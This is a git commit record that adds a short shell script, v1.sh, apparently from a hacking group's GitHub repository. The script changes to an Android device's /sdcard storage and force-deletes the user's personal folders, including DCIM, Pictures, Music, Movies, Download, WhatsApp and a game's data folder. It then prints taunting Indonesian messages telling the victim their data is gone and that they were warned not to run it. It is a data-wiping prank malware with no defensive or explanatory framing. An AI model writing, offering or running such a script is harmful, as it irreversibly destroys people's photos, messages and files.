369f2525b077c8d9542a6957621685a600ec484a
BlackCyber009 <57897184+BlackCyber091@users.noreply.github.com>
2019-11-21 13:51:28 +0700

    Add files via upload

---
+++ v1.sh
@@ -0,0 +1,19 @@
+
+cd /sdcard
+rm -rf Android
+rm -rf android
+rm -rf vidio
+rm -rf vidioku
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+echo "Mampues Hilang Semua Data Loe"
+echo "Udah Di Bilangin Jagan Di Pakai Ya Masih Di Pakai"
+echo "Mr.Devil Tersakiti Ya Gini"
+echo "Salah Siapa Gk Percaya"
+echo "Salam Dari DrCyberTeam"
